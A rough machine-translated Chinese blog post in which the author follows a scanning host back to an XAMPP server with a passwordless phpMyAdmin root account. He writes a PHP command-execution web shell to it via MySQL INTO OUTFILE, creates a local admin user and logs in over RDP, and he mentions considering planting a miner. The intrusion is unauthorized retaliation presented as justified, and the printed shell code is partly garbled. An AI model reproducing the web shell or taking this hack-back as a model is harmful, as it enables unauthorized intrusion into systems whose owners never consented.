# 安全测试:对抗机器人

> 原文：<https://dev.to/sm0k3/security-testing-fighting-against-bots-2k6o>

工作中出现了一个相当有趣的情况，在检查了 SIEM 中的事件后，又一次发现了下一个扫描事件。某个来自巴西的奇怪主机再次扫描了我们的各种漏洞。写另一个 abuz 是懒惰的，我决定看看什么样的主机和可以用它做什么。

第一件事立即转向服务 2ip，并试图找出那里挂着什么，什么域，但没有给出任何有趣的东西。我启动了 nmap，浏览了各个端口，也扫描了目录，也没什么特别的，但是直接访问服务器把我们扔进了 XAMPP 网络服务器的仪表板，那里有不同码头、指南和...phpMyAdmin

[![alt text](img/832c7b8264286310032133cb46a7c558.png "Target XAMPP Server Info")](https://res.cloudinary.com/practicaldev/image/fetch/s--6ooVAJwm--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://thepracticaldev.s3.amazonaws.com/i/wwpvynr4j4fzsyyrehas.png)

令我惊讶的是，挂着 phpMyAdmin 的 MySQL 数据库没有密码保护，那么就已经有技术问题了。除了实用程序数据库之外，我们还发现了一个 phpinfo 文件，它向我们报告了 xampp 中仪表板的位置，以及相应地，加载 web 所需的所有路径。

[![alt text](img/d8dd231ea61a8fb707decfacbe0d2df3.png "Target Server PHP Info")](https://res.cloudinary.com/practicaldev/image/fetch/s--mycCXzuC--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://thepracticaldev.s3.amazonaws.com/i/9ir6g9inpwjumgg6fxhw.png)

下一步是检查登录到管理区，但正如我上面写的，root 密码没有设置，因此我们有完全访问权。也许，在安装过程中(或者在安装后，当设置数据库时)，由于某种原因，不是本地主机，而是整个互联网访问数据库。我假设 root 用户没有被分配密码，并期望 base 仅在本地可用。

因为这个失误，有人爬到这些家伙的服务器上，开始对互联网上的随机系统进行自动扫描，寻找漏洞，包括我们的电子邮件和其他东西。

好吧，让我们继续我们简单的探索，去数据库:

[![alt text](img/4c89112e4d70035670f315a11373255f.png "Target MySQL & phpMyAdmin")](https://res.cloudinary.com/practicaldev/image/fetch/s--By9Onip2--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://thepracticaldev.s3.amazonaws.com/i/u67jovc6shas3uzkxe5g.png)

正如你所看到的——有所有的入口，然后它只剩下展示一次幻想的飞行。如你所知，Windows 机器上的 web 服务器是作为系统用户工作的，但这已经是众所周知的了。我们只需要加载 web shell，然后停止扫描我们的基础设施(好的方面——去掉所有恶意软件，不好的方面——在内部防火墙上拦截我们的 IP)。

使用 INTO OUTFILE 命令通过 MySQL 数据库加载 web shell:

[![alt text](img/ca1f5f0e54f35f3b3ae931e4bca1e156.png "Sending Web Shell To Target Server")](https://res.cloudinary.com/practicaldev/image/fetch/s--qLKlr16E--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://thepracticaldev.s3.amazonaws.com/i/qcmg7gozkexka6agsj6q.png)

外壳代码本身:

```
<HTML> <BODY> <FORM METHOD = 'GET' NAME = 'myform' ACTION = ''>
<INPUT TYPE = 'text' NAME = 'cmd'> <INPUT TYPE = 'submit' VALUE = 'Send'> </ FORM>
<pre> <? php if ($ _ GET ['cmd']) {system ($ _ GET ['cmd']); }?>
</ pre> </ BODY> </ HTML> 
```

实际上，这可能是所有的，进一步的行动是相当令人期待的。从 web shell 中，我们只需要访问服务器来添加一个用户，将其放在本地管理员组中，并通过 RDP 连接到服务器。

[![alt text](img/a33b88ce8f8ff4f522206f5ee2015c82.png "Target Windows Server Access")](https://res.cloudinary.com/practicaldev/image/fetch/s--GGZrhWIU--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://thepracticaldev.s3.amazonaws.com/i/qyz570rvqc3hzoyoke5a.png)

因此，这不是一个从互联网上扫描我们的基础设施的不那么棘手的方法。也有想法放置一个矿工在那里，但排气将是最小的，不值得。额外的收获是，我从服务器上删除了其他 web shells，我没有挂起数据库密码，因为在那里，除了根用户之外，没有其他人，并且很可能一些使用该数据库的应用程序已经崩溃。

当执行所有的操作时，只有早先攻击过这个服务器的攻击者受到了影响——他们的后门被移除了。